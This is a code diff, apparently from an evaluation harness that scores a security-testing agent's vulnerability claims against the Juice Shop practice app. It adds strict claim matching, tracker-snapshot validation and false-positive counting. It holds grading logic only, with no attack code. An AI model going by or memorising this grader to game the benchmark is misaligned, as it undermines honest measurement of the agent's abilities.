-    confirmed_vuln_classes |= _detect_path_traversal(target, token)
-    confirmed_vuln_classes |= _detect_file_upload(target, token)
-    confirmed_vuln_classes |= _detect_xss_stored(target, token)
-    confirmed_vuln_classes |= _detect_clickjacking(target, token)
-    confirmed_vuln_classes |= _detect_cors(target, token)
-    confirmed_vuln_classes |= _detect_csrf(target, token)
+    confirmed_vuln_classes |= {
+        claim
+        for claim in _detect_null_byte_input_validation(target, token)
+        if isinstance(claim, ChallengeClaim)
+    }
+    confirmed_vuln_classes |= {
+        claim for claim in _detect_file_upload(target, token) if isinstance(claim, ChallengeClaim)
+    }
+    confirmed_vuln_classes |= {
+        claim for claim in _detect_xss_stored(target, token) if isinstance(claim, ChallengeClaim)
+    }
+    # Structural client-side classes remain out of scope for this gate. Their
+    # detectors still execute and write only oracle-confirmed findings, but their
+    # class labels must not enter strict typed claim scoring as mixed modes.
+    _detect_clickjacking(target, token)
+    _detect_cors(target, token)
+    _detect_csrf(target, token)
 
-    after = fetch_tracker(target)
-    return score_run(before, after, confirmed_vuln_classes)
+    try:
+        after = fetch_tracker(target)
+    except TrackerSnapshotError as exc:
+        return JuiceshopRun.not_measurable(baseline=None, detail=str(exc))
+    after_assessment = validate_tracker_snapshot(after)
+    if after_assessment.state is not BaselineState.CLEAN:
+        return JuiceshopRun.not_measurable(
+            baseline=after_assessment,
+            detail=f"post-run tracker is not measurable: {after_assessment.detail}",
+        )
+    return score_run(before, after, confirmed_vuln_classes, strict_scope=True)
 
 
 def score_run(
     before: dict[str, dict[str, object]],
     after: dict[str, dict[str, object]],
-    confirmed_vuln_classes: set[str],
+    claims: set[ChallengeClaim] | set[str],
+    *,
+    strict_scope: bool = False,
 ) -> JuiceshopRun:
-    """Build a :class:`JuiceshopRun` from before/after tracker snapshots + oracle signal.
+    """Build run metrics from tracker snapshots and detector claims.
 
-    Pure — no live target — so the per-challenge delta and the class-level
-    false-positive rule are unit-testable with synthetic inputs.
-    ``confirmed_vuln_classes`` is the set of real ``vuln_class`` strings whose oracle
-    confirmed a finding this run (e.g. ``{"sqli", "jwt_forgery"}``).
-
-    Coverage attribution is unchanged: a challenge is credited only if the tracker
-    flipped it ``unsolved → solved`` this run (delta), never inflated by a
-    confirmation. Class-level FPs are booked only for in-scope classes; a confirmed
-    vuln_class that maps out of scope books nothing.
+    ``strict_scope`` is used by live gate runs. It limits denominator and claim
+    matching to verified runtime keys, avoiding broad category inflation. Legacy
+    class-string behavior remains available for older synthetic metric tests.
     """
+    if strict_scope:
+        assessment = validate_tracker_snapshot(before)
+        after_assessment = validate_tracker_snapshot(after)
+        if assessment.state is not BaselineState.CLEAN:
+            return JuiceshopRun.not_measurable(
+                baseline=assessment,
+                detail=assessment.detail,
+            )
+        if after_assessment.state is not BaselineState.CLEAN:
+            return JuiceshopRun.not_measurable(
+                baseline=after_assessment,
+                detail=f"post-run tracker is not measurable: {after_assessment.detail}",
+            )
+        if set(before) != set(after):
+            return JuiceshopRun.not_measurable(
+                baseline=after_assessment,
+                detail="post-run tracker key set differs from clean baseline",
+            )
     run = JuiceshopRun()
+    typed_claims = {claim for claim in claims if isinstance(claim, ChallengeClaim)}
+    legacy_classes = {claim for claim in claims if isinstance(claim, str)}
+    if strict_scope and typed_claims and legacy_classes:
+        raise ValueError("strict scoring does not accept mixed claim modes")
+    # Tracker flips are ground truth for state, not evidence that ReachAgent
+    # confirmed the corresponding challenge.  Legacy class-only claims are
+    # retained for synthetic compatibility, but a live strict run must never
+    # infer a claim from an empty detector result.
+    typed_mode = bool(typed_claims)
+    if strict_scope and not typed_mode:
+        legacy_classes = set()
     flipped_classes: set[str] = set()
+    scope = VERIFIED_CHALLENGE_SCOPE if strict_scope else None
     for ch_key, ch_info in after.items():
-        scope_class = in_scope_class(str(ch_info["category"]))
+        scope_class = (
+            scope.get(ch_key) if scope is not None else in_scope_class(str(ch_info["category"]))
+        )
         if scope_class is None:
             continue
         solved_after = bool(ch_info["solved"])
         newly_solved = solved_after and not bool(before.get(ch_key, {}).get("solved", False))
+        matched_claim = next(
+            (
+                claim
+                for claim in typed_claims
+                if claim.challenge_key == ch_key
+                and claim_scope_class(
+                    claim.vuln_class,
+                    claim.challenge_key,
+                    claim.scope_class,
+                )
+                == scope_class
+            ),
+            None,
+        )
+        reason = "tracker remains unsolved"
+        if newly_solved and matched_claim is not None:
+            reason = (
+                f"tracker solved after matching oracle claim; evidence={matched_claim.evidence_ref}"
+            )
+        elif newly_solved:
+            reason = "tracker solved without matching oracle claim"
+        elif solved_after:
+            reason = "tracker was already solved before run"
+        elif typed_mode and any(claim.challenge_key == ch_key for claim in typed_claims):
+            reason = "oracle claim did not produce tracker completion"
         if newly_solved:
             flipped_classes.add(scope_class)
         run.results.append(
             ChallengeResult(
                 vuln_class=scope_class,
                 challenge_key=ch_key,
-                confirmed=newly_solved,
+                confirmed=(newly_solved and matched_claim is not None)
+                if (typed_mode or strict_scope)
+                else newly_solved,
                 tracker_solved=solved_after,
+                reason=reason,
             )
         )
-    # Map each confirmed vuln_class to its in-scope class; an out-of-scope
-    # confirmation (vuln_class_to_scope_class → None) books nothing.
+    if typed_mode:
+        claims_by_key = {claim.challenge_key: claim for claim in typed_claims}
+        for claim in claims_by_key.values():
+            expected_scope = scope.get(claim.challenge_key) if scope is not None else None
+            claim_scope = claim_scope_class(
+                claim.vuln_class,
+                claim.challenge_key,
+                claim.scope_class,
+            )
+            if expected_scope is None and scope is not None:
+                continue
+            challenge = after.get(claim.challenge_key)
+            if challenge is None or not bool(challenge["solved"]):
+                run.claim_false_positives += 1
+                continue
+            challenge_scope = (
+                scope.get(claim.challenge_key)
+                if scope is not None
+                else in_scope_class(str(challenge["category"]))
+            )
+            if claim_scope != challenge_scope:
+                run.claim_false_positives += 1
+                continue
+            if not bool(before.get(claim.challenge_key, {}).get("solved", False)):
+                continue
+        return run
+
     confirmed_scope_classes = {
-        scope
-        for vc in confirmed_vuln_classes
-        if (scope := vuln_class_to_scope_class(vc)) is not None
+        scope_class
+        for vuln_class in legacy_classes
+        if (scope_class := vuln_class_to_scope_class(vuln_class)) is not None
     }
-    # Class-level false positive: an in-scope class's oracle confirmed but no
-    # in-scope challenge of that class flipped this run.
-    for scope_class in IN_SCOPE_CLASSES:
+    for scope_class in set(VERIFIED_CHALLENGE_SCOPE.values()) if strict_scope else IN_SCOPE_CLASSES:
         if scope_class in confirmed_scope_classes and scope_class not in flipped_classes:
             run.class_false_positives += 1
     return run
